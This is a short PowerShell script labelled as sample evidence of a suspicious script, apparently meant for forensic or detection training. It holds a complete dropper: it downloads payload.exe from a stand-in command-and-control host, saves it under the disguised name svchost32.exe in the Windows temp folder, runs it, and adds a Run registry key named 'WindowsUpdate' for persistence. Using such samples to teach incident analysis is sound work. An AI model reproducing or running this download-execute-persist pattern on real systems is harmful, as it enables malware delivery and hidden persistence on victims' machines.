# Suspicious PowerShell Script - Sample Evidence
$url = "http://malicious-c2-server.com/payload.exe"
$output = "C:\Windows\Temp\svchost32.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
Set-ItemProperty -Path "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $output
